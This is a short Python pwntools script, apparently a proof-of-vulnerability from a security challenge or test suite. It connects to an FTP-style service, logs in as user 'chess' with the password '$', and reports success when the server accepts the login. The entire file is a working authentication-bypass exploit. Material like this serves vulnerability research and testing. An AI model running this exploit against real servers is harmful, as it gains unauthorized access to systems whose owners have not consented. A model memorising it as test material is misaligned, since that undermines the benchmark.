#!/usr/bin/env python3

from pwn import *
import sys
import signal

def handler(signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def main(host, port):
    c = remote(host, port)

    c.readline()
    ## Change this to the chess user
    c.send(b'USER chess\n')
    y = c.readline()

    if y.find(b'331 Please specify') == -1:
        print('[FAIL] Unknown response from the server: %s' %(y))
        exit(1)

    print('[INFO] Username Sent')

    c.send(b'PASS $\n')

    try:
        y = c.readline()
    except:
        print('[FAIL] POV did not succeed')
        exit(1)

    if y.find(b'230 Login successful.') == -1:
        print('[FAIL] Did not receive a successful login response: %s' %(y))
        exit(1)

    print('[SUCCESS] POV Succeeded')
    c.send(b'QUIT\n')
    c.readline()
    c.close()
    exit(0)

if __name__ == '__main__':
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])
    else:
        SEED = random.randint(0, 2**64 - 1)

    print('[INFO] SEED: {0}'.format(SEED))

    random.seed( SEED )

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(5)

    main(HOST, PORT)
